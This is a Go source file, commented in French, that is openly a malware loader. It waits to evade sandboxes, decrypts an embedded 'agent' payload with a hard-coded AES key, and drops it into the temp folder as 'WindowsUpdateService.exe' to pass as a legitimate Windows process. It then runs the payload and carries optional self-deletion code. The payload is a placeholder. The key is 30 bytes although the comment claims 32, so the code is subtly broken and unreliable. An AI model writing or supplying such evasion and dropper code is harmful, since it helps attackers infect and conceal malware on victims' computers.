package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// Agent chiffré en base64 (sera remplacé par le script de build)
const encryptedAgent = "PLACEHOLDER"

// Clé AES-256 (32 bytes)
var key = []byte("SuperSecretKey1234567890123456")

func main() {
	// Anti-sandbox: sleep
	time.Sleep(10 * time.Second)

	// Decode base64
	encrypted, err := base64.StdEncoding.DecodeString(encryptedAgent)
	if err != nil {
		return
	}

	// Déchiffrer AES-GCM
	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}

	nonceSize := gcm.NonceSize()
	if len(encrypted) < nonceSize {
		return
	}

	nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return
	}

	// Écrire dans temp avec nom légitime
	tempPath := filepath.Join(os.TempDir(), "WindowsUpdateService.exe")
	if err := os.WriteFile(tempPath, plaintext, 0755); err != nil {
		return
	}

	// Exécuter
	cmd := exec.Command(tempPath)
	cmd.Start()

	// Auto-destruction du loader (optionnel)
	// os.Remove(os.Args[0])
}
